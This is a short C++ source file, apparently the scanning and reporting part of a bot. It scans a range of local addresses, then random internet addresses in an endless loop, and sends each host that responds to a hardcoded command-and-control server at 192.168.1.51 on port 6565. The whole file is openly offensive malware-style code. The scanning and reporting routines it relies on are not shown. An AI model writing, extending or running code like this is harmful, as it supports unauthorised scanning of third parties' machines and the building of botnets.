// nastyboi.cpp : Defines the entry point for the console application.
//
#include <iostream>
#include <string>
#include <ws2tcpip.h>
#include "stdafx.h"
#include "stdio.h"
#include "ip.h"
#include "scan.h"
#pragma comment(lib, "ws2_32.lib")

using namespace std;

int contactCnC(string send_data) {
	int remoteport = 6565;
	string serverip = "192.168.1.51";

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		cerr << "Can't create socket, " << WSAGetLastError() << endl;
		return 1;
	}

	//string ipaddr = getiplocal(target);
	cout << "Contacting CnC with found IP" << endl;

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(remoteport);
	inet_pton(AF_INET, serverip.c_str(), &hint.sin_addr);


	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR) {
		cerr << "Could not connect to CnC: " << WSAGetLastError() << endl;
		closesocket(sock);
		return 1;
	}
	
	cout << "successfully connected to CnC" << endl;

	int sendresult = send(sock, send_data.c_str(), send_data.size() + 1, 0);

	if (sendresult == SOCKET_ERROR) {
		cerr << "Error sending data to CnC: " << sendresult << endl;
		closesocket(sock);
		return 1;
	}

	closesocket(sock);
	return 0;
}

int main()
{
	cout << ">" << endl;
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0) {
		cerr << "Winsock startp err, " << wsResult << endl;
		getchar();
		return 1;
	}

	unsigned int i;
	
	for (i = 45; i < 60; i++) {
		string toscan = getiplocal(i);
		if (scan(toscan) == 0) {
			contactCnC(toscan);
		}
	}

	while (true) {
		string toscan = getiprand();
		if (scan(toscan) == 0) {
			contactCnC(toscan);
		}
	}
	
	getchar();
	WSACleanup();
    return 0;
}

